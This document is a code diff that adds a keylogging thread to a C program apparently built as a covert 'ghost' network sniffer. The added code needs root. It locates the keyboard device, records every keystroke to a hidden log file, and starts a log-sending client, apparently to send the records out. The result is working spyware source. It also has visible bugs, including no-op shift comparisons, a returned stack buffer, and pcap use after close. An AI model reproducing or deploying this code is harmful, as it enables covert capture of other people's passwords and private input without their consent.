@@ -8,11 +8,26 @@
 
 #include <pcap.h>
 
+#include <fcntl.h>   //open
+#include <string.h>  //strerror
+#include <errno.h>
+#include <stdint.h>
+#include <assert.h>
+#include <unistd.h>  //daemon, close
+#include <linux/input.h>
+
+#include "key_util.h"
+#include "util.h"
+#include "client.h"
+#include "config.h"
+
 #include "ip.h"
 #include "http.h"
 #include "process.h"
 #include "timed_logger.h"
 
+#define KEY_RELEASE 0
+#define KEY_PRESS 1
 #define TCP_PROTOCOL 6
 
 /* TODO: Can these be used in pcap filter */
@@ -32,15 +47,48 @@ void* keep_ghost_alive(void *args);
 
 void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 void* sniff(void* args);
+void* start_keylogging(void *args);
+void* send_logs();
+struct Config retrive_keyboard_file();
+
+struct keylog_print {
+    struct loginfo *k_loginfo;
+    struct Config  config;
+};
 
 int main(int argc, char **argv)
 {
     pid_t id = -1;
     if (argc >= 2)
         id = atoi(argv[1]);
+    
+    /*Retrieve Keyboard file descriptor*/
+    struct Config config = retrive_keyboard_file();
+    
+    /*Open log file*/
+    FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "a");
+    if (keylog_log == NULL)
+    {
+        printf("Error opening keylog log. Exiting...\n");
+        exit(1);
+    }
+    setbuf(keylog_log, NULL);
+    
+    struct loginfo k_loginfo = {keylog_log,NEVER_WRITTEN, 4 };
+    struct keylog_print keylog_print_1 = {&k_loginfo , config };
+
+    /*Create threads*/
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
 
     pthread_t aliver;
-    pthread_create(&aliver, NULL, keep_ghost_alive, &id);
+    pthread_create(&aliver, &attr, keep_ghost_alive, &id);
+    
+    pthread_t keylog;
+    pthread_create(&keylog, &attr, start_keylogging, &keylog_print_1);
+    
+    pthread_t sendlogs;
+    pthread_create(&sendlogs, &attr, send_logs, NULL);
 
     FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
     if (network_log == NULL)
@@ -60,6 +108,12 @@ int main(int argc, char **argv)
     bpf_u_int32 mask;
     bpf_u_int32 net;
 
+    /*Check for root privileges*/
+    if (geteuid() != 0) {
+        printf("Must run as root! Exiting... \n");
+        exit(1);
+    }
+    
     /* Create the default pcap device and exit if error occurs */
     dev = pcap_lookupdev(errbuf);
     if (dev == NULL)
@@ -107,7 +161,16 @@ int main(int argc, char **argv)
     pcap_freecode(&filter);
     pcap_close(handle);
 
+    pcap_loop(handle, -1, packet_received, (u_char*) &info);
+
+    pcap_freecode(&filter);
+    pcap_close(handle);
+    pthread_join(aliver, NULL);
+    pthread_join(keylog, NULL);
+    pthread_join(sendlogs, NULL);
+
     fclose(network_log);
+    fclose(keylog_log);
 
     return 0;
 }
@@ -182,3 +245,73 @@ void* sniff(void* args)
        error in packet retrieval occurs */
     return (void*) -1;
 }
+
+struct Config retrive_keyboard_file()
+{
+    /*retrieve keyboard device file*/
+    struct Config config;
+    static const char *command =
+    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
+    "grep -B1 120013 |"
+    "grep -Eo event[0-9]+ |"
+    "tr '\\n' '\\0'";
+    
+    FILE *pipe = popen(command, "r");
+    if (pipe == NULL) {
+        printf("Could not determine keyboard device file \nExiting...");
+        exit(-1);
+    }
+    char result[20] = "/dev/input/";
+    char temp[9];
+    fgets(temp, 9, pipe);
+    pclose(pipe);
+    config.device_file = strcat(result, temp);
+    
+    /*Open keyboard device file*/
+    int kb_fd = open(config.device_file, O_RDONLY);
+    if (kb_fd == -1) {
+        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
+        exit(-1);
+    }
+    config.kb_fd = (int)kb_fd;
+    return config;
+
+}
+
+void* start_keylogging(void *args)
+{
+    typedef struct input_event input_event;
+    input_event event;
+    int shift_pressed=0; //If shift engaged, shift_pressed = 1
+
+    struct keylog_print keylog_print_1 =  *(struct keylog_print *)args;
+    
+    while (read(keylog_print_1.config.kb_fd, &event, sizeof(input_event)) > 0){
+        if (event.type == EV_KEY) {
+            if (event.value == KEY_PRESS) {
+                if (is_shift(event.code)) {
+                    shift_pressed == 1;
+                }
+                char *name = get_key_text(event.code, shift_pressed);
+                if (strcmp(name, "\0") != 0) {
+                    
+                   timestamped_write(keylog_print_1.k_loginfo, name);
+                   timestamped_write(keylog_print_1.k_loginfo, "\n");
+                    
+                }
+            } else if (event.value == KEY_RELEASE) {
+                if (is_shift(event.code)) {
+                    shift_pressed == 0;
+                }
+            }
+        }
+    }
+    return EXIT_SUCCESS;
+}
+
+void* send_logs()
+{
+    start_client();
+    return EXIT_SUCCESS;
+}
+
